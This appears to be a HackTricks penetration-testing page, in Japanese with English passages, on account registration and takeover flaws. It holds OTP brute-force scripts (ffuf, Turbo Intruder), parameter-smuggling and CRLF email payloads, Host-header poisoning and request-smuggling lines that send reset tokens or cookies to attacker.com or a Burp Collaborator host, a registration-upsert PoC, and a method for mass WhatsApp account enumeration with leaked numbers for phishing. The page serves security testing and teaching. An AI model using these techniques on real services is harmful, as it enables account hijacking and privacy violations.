# 登録とテイクオーバーの脆弱性

{{#include ../banners/hacktricks-training.md}}

## アカウント登録の乗っ取り

### 重複登録

- 既存の username を使って生成してみる
- email を変えて試す:
- 大文字
- +1@
- email にドットを追加
- メール名に特殊文字を入れる (%00, %09, %20)
- メールの後に空白文字を置く: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- メールプロバイダの正規化トリックを試す（サービス依存）:
- Gmail はドットとサブアドレッシングを無視する：`victim+1@gmail.com`, `v.ic.tim@gmail.com` は `victim@gmail.com` に届く
- 一部のプロバイダはローカルパートで大文字小文字を区別しない
- 一部のプロバイダは Unicode の confusables を受け入れる。ホモグリフやソフトハイフン `\u00AD` をローカルパートに試す
- これらを悪用して：一意性チェックを回避、重複アカウント/ワークスペース招待を取得、または乗っ取り準備中に被害者のサインアップをブロック（一時的な DoS）

### Username Enumeration

Check if you can figure out when a username has already been registered inside the application.

- エラーメッセージや HTTP ステータスコードの違い
- タイミングの違い（既存ユーザは IdP/DB へのルックアップを引き起こす可能性がある）
- 既知の email に対する登録フォームのプロフィールデータ自動入力
- チーム/招待フローを確認: email を入力するとアカウントの有無が判明する場合がある

### Password Policy

ユーザ作成時にパスワードポリシーを確認する（弱いパスワードが使えるかを確認）。\
その場合、資格情報のブルートフォースを試みることができる。

### SQL Injection

[**このページを確認** ](sql-injection/index.html#insert-statement) レジストリフォームで **SQL Injections** を利用してアカウントのテイクオーバーを試みたり情報を抽出する方法を学べます。

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### メールアドレスの変更

登録後、メールアドレスを変更して、その変更が正しく検証されているか、任意のメールに変更できるか確認する。

### 追加の確認事項

- **disposable emails**（mailinator, yopmail, 1secmail 等）を使えるか確認する、または `victim+mailinator@gmail.com` のようなサブアドレッシングでブロックリストを回避できるか確認する
- 長いパスワード（>200）は **DoS** を引き起こす可能性がある
- アカウント作成時のレート制限を確認する
- username@**burp_collab**.net を使用して **callback** を解析する
- 電話番号認証が使われている場合、電話番号のパース/インジェクションのエッジケースを確認する

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

電話番号中心のメッセンジャは、クライアントが連絡先を同期するたびに **presence oracle** を公開する。WhatsApp の discovery リクエストをリプレイすると歴史的に **>100M lookups per hour** を達成し、ほぼ完全なアカウント列挙を可能にした。

**Attack workflow**

1. **Instrument an official client** してアドレス帳アップロードリクエストをキャプチャする（正規化された E.164 番号の認証済み blob）。同じクッキー/デバイストークンを再利用しつつ、攻撃者生成の番号でリプレイする。
2. **Batch numbers per request**：WhatsApp は何千もの識別子を受け取り、登録/未登録とメタデータ（business, companion 等）を返す。被害者にメッセージを送らずに、レスポンスをオフラインで解析してターゲットリストを構築する。
3. **Horizontally scale** 列挙を SIM バンク、クラウドデバイス、または residential proxies で水平スケールさせ、アカウント/ IP/ ASN ごとのスロットリングが発動しないようにする。

**Dialing-plan modeling**

各国のダイヤリングプランをモデリングして無効な候補をスキップする。NDSS データセット（`country-table.*`）は国コード、採用密度、プラットフォーム分布を示すので、高ヒットレンジを優先できる。Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
実際の割り当て（Mobile Country Code + National Destination Code）と一致するプレフィックスを優先してからオラクルに問い合わせ、スループットを実用的に保つ。

**Turning enumerations into targeted attacks**

- oracle に leaked phone numbers（例: Facebook’s 2021 breach）を投入して、phishing、SIM-swapping、または spamming を行う前にどのアイデンティティがまだアクティブか確認する。
- 国/OS/アプリ種別で集計データを切り分け、SMS フィルタリングが弱い地域や WhatsApp Business の採用が多い地域を見つけて、ローカライズされた social engineering に活用する。

**Public-key reuse correlation**

WhatsApp はセッション設定中に各アカウントの X25519 identity key を公開する。enumerated した番号ごとに identity material を要求して公開鍵を重複除去すると、アカウントファーム、クローンされたクライアント、または脆弱なファームウェアが明らかになる — 共有キーは multi-SIM 運用の匿名性を剥奪する。

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows はしばしば数値 OTP や magic-link トークンで所有権を検証する。典型的な脆弱性:

- 推測可能または短い OTP (4–6 digits) で有効なレート制限や IP/デバイス追跡がない。並列推測やヘッダー/IP ローテーションを試す。
- OTP がアクション間やアカウント間で再利用される、または特定のユーザ／アクションに紐づいていない（例: 同じコードが login と signup の両方で有効、あるいは email が変更された後でも有効）。
- Multi-value smuggling: 一部のバックエンドは複数のコードを受け取り、どれかが一致すれば検証する。試す:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: ステータス／メッセージ／レスポンス本文の長さから wrong vs expired vs wrong-user のコードを区別する。
- トークンが成功後や password/email 変更後に無効化されない。
- 検証トークンが user agent/IP に紐づいておらず、攻撃者制御下のページからのクロスオリジンで完了できてしまう。

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
逐次ロックアウトを回避するための並列/同時推測（BurpのTurbo Intruderを使用）:

<details>
<summary>Turbo Intruderスニペット（6桁のOTP試行を大量送信）</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

攻撃者が被害者のメールに対して被害者がアカウントを作成する前に操作を行い、後でアクセスを取り戻す場合に発生する強力な問題群。

主なテスト技術（ターゲットのフローに合わせて調整）:

- Classic–Federated Merge
  - Attacker: registers a classic account with victim email and sets a password
  - Victim: later signs up with SSO (same email)
  - Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
  - Attacker: creates account and holds a long‑lived session (don’t log out)
  - Victim: recovers/sets password and uses the account
  - Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
  - Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
  - Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
  - Attacker: initiates email‑change to attacker mail and withholds confirmation
  - Victim: recovers the account and starts using it
  - Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
  - Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
  - Victim: signs up via classic route
  - Service merges on email without checking `email_verified` or performing local verification

Practical tips

- web/mobile バンドルからフローとエンドポイントを収集する。classic signup、SSO linking、email/phone change、password reset のエンドポイントを探す。
- 他のフローを試す間にセッションを維持する現実的な自動化を作る。
- SSO テストでは、テスト用 OIDC provider を立て、victim アドレスの `email` クレームと `email_verified=false` を含むトークンを発行して、RP が未検証の IdP を信用するか確認する。
- いかなる password reset や email 変更の後も、次を確認する：
  - 全ての他の sessions と tokens が無効化されていること、
  - 保留中の email/phone change 機能が取り消されていること、
  - 以前にリンクされた IdPs/emails/phones が再検証されていること。

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### APIパラメータにおける IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 攻撃者は自分のアカウントでログインし、**Change password** 機能に移動する。
2. Burp Suite を起動してリクエストを intercept する
3. Repeater タブへ送ってパラメータを編集する：User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

password reset token は毎回ランダムに生成され一意であるべきである。\
トークンが有効期限付きか、常に同じかを確認する。場合によっては生成アルゴリズムが弱く推測可能なことがある。アルゴリズムで使用される可能性のある変数は次のとおり。

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. API/UI を使って特定のメール（例: test@mail.com）で password reset リクエストをトリガーする
2. サーバーのレスポンスを確認し `resetToken` が含まれているかチェックする
3. その後、次のような URL でトークンを使用する： `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 被害者の username と同一だが前後に空白を挿入した username でシステムに登録する。例: `"admin "`
2. 悪意ある username で password reset をリクエストする。
3. 自分のメールに送られたトークンを使って被害者のパスワードをリセットする。
4. 新しいパスワードで被害者のアカウントにログインする。

プラットフォーム CTFd はこの攻撃に対して脆弱だった。\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. アプリケーション内、または cookies が親ドメインにスコープされているサブドメイン上で XSS を見つける： `*.domain.com`
2. Leak the current **sessions cookie**
3. その cookie を使ってユーザーとして認証する

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. **smuggler** を使って HTTP Request Smuggling の種類 (CL, TE, CL.TE) を検出する\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. `POST / HTTP/1.1` を次のデータで上書きするリクエストを作成する：\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — 目的は victim を burpcollab に open redirect させて cookies を盗むこと
3. Final request could look like the following
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone によるこのバグの悪用報告\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF を介したアカウント乗っ取り <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF のペイロードを作成する。例: “HTML form with auto submit for a password change”
2. ペイロードを送信する

### JWT を介したアカウント乗っ取り <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token はユーザー認証に使われている場合がある。

- 別の JWT に別の User ID / Email を書き換える
- JWT の弱い署名を確認する


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

一部の signup ハンドラは、提供された email が既に存在する場合に upsert を実行する。エンドポイントが email と password を含む最小限のボディを受け付け、所有権の検証を行わない場合、被害者の email を送ることで事前認証のままパスワードを上書きできる。

- Discovery: バンドルされた JS (または mobile app トラフィック) から endpoint 名を収集し、/parents/application/v4/admin/FUZZ のようなベースパスを ffuf/dirsearch で fuzz する。
- Method hints: GET が "Only POST request is allowed." のようなメッセージを返す場合、それは正しい HTTP 動詞が POST で JSON ボディが期待されていることを示すことが多い。
- 実際に観測された最小ボディ例:
```json
{"email":"victim@example.com","password":"New@12345"}
```
PoCの例:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
影響: reset token、OTP、またはメール認証なしでの完全なAccount Takeover (ATO)。

## 参考文献

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
